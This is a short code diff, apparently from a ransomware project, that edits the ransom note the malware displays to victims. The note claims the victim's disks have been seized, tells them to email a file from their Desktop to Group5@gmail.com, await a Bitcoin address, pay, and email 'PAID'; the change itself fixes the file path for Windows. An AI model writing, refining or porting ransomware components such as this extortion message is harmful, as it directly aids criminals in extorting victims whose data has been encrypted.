@@ -135,7 +135,7 @@ Your computer's hard disks have been infiltrated and seized by a sophisticated, 
 
 To retrieve your key and reclaim control of your data, you must meticulously follow these ominous steps:
 
-    1. Locate the file named EMAIL_US.txt on your Desktop ({self.sys_root}Desktop/EMAIL_US.txt) and immediately send it to Group5@gmail.com.
+    1. Locate the file named EMAIL_US.txt on your Desktop ({self.sys_root}\Desktop\EMAIL_US.txt) and immediately send it to Group5@gmail.com.
 
     2. Await the arrival of your exclusive BTC address for the required ransom. Upon completing the payment, dispatch another email to Group5@gmail.com with the subject "PAID". Rest assured, we will verify your compliance.
 
